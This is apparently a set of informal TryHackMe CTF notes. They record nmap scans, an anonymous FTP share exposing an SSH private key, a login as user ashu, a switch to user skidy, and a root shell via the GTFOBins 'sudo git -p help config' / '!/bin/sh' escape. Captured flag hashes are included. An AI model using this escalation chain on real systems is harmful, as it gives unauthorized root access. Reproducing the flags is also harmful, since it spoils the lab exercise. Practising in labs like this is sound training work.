target :10.10.220.23
└─# nmap -f -sC -sV -T5 10.10.220.23  
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d34a2eaedfdbe11bc1622bce1500736e (RSA)
|   256 2e6362b79516ea0a010e12ef6621230b (ECDSA)
|_  256 20fea0ce52f9357b8a7ad0eec1419690 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9001/tcp open  tor-orport?
| fingerprint-strings: 
|   GenericLines, GetRequest, JavaRMI, Radmin: 
|     ================================================
|     Ashu's Password Protected Backdoor 
|     ================================================
|     Password Incorrect
|   NULL, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, mongodb: 
|     ================================================
|     Ashu's Password Protected Backdoor 
|_    ================================================
9002/tcp open  dynamid?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RTSPRequest: 
|     Overly Limited Shell
|     Segfault
|   GenericLines, Help: 
|     Overly Limited Shell
|     Command Executed
|   NULL, RPCCheck: 
|_    Overly Limited Shell
9999/tcp open  http        Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Thu, 07 Sep 2023 16:16:39 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   GenericLines, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Thu, 07 Sep 2023 16:16:35 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Thu, 07 Sep 2023 16:16:38 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Connection: close
|_    Request: missing required Host header
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

Port 21 is open now i will do some recon 
└─# nmap -sC -sV -p21 10.10.220.23
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.128.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp           393 Sep 07 09:20 authorized_keys [NSE: writeable]
| -rwxrwxrwx    1 ftp      ftp            33 Mar 26  2020 flag.txt [NSE: writeable]
| -r--r--r--    1 ftp      ftp          1679 Sep 07 09:20 id_rsa
|_-rwxrwxrwx    1 ftp      ftp           393 Sep 07 09:20 id_rsa.pub [NSE: writeable]
Service Info: OS: Unix
cde6951cf12ff485d6d33ad7a2e6ac49
found this in id_rsa.pub :ashu@ubuntu
user ashu
chmod 600 on id_rsa
ashu@thm-prod:/home$ sudo -l
Matching Defaults entries for ashu on thm-prod:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ashu may run the following commands on thm-prod:
    (root) NOPASSWD: /bin/su skidy, /usr/bin/chattr
ashu@thm-prod:/home$ 
in home we will find user skidy
ashu@thm-prod:/home$ ls
ashu  skidy
Now we will switch to skidy
04461ad0759944a4d743deec6bbd8d54
skidy@thm-prod:/home/skidy$ sudo -l
Matching Defaults entries for skidy on thm-prod:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User skidy may run the following commands on thm-prod:
    (root) SETENV: NOPASSWD: /usr/bin/git *, /usr/bin/chattr
we find : https://gtfobins.github.io/gtfobins/git/
sudo git -p help config
!/bin/sh


eabe4da21f519b8d6726427df7e683c5
cde6951cf12ff485d6d33ad7a2e6ac49



Ashu's Password Protected Backdoor
user ashu
──(root㉿kali)-[/home/kali/CTFs/tryhackme]
└─# nmap -sC -p21 10.10.22.169
Starting Nmap 7.93 ( https://nmap
found something 